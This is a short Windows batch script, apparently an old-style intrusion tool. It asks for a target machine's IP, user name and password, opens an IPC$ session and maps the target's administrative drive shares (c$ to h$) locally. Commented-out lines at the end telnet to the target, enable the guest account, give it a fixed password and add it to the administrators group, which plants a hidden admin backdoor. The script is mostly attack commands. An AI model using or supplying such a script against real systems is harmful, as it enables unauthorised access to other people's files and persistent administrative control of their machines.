@echo off
color 0a
set /p ip=please enter the other side's ip:
set /p password=please enter the other side's password:
set /p user=please enter the other side's user:
cls
echo.
set var=">"
set/p=正在进行IPC连接... <nul
echo.
ping -n 2 127.1>nul
for /l %%i in (1,1,70) do (
set/p=%var%<nul
ping -n 0 127.1>nul
)
echo.
echo.
cls
net use \\%ip%\ipc$ "%password%" /user:"%user%"
if %errorlevel%==0 echo IPC ok.
echo --------------------------------------
echo Now map the harddisk...
net use z: \\%ip%\c$ "%password%" /user:"%user%"2>nul||net use y: \\%ip%\d$ "%password%" /user:"%user%"2>nul||net use x: \\%ip%\e$ "%password%" /user:"%user%"2>nul||net use w: \\%ip%\f$ "%password%" /user:"%user%"2>nul||net use v: \\%ip%\g$ "%password%" /user:"%user%"2>nul||net use t: \\%ip%\h$ "%password%" /user:"%user%"2>nul

echo Finished...&pause>nul&exit
::telnet %ip%
::net user guest /active:yes 
::net user guest hz3755
::net localgroup administrators guest /add 
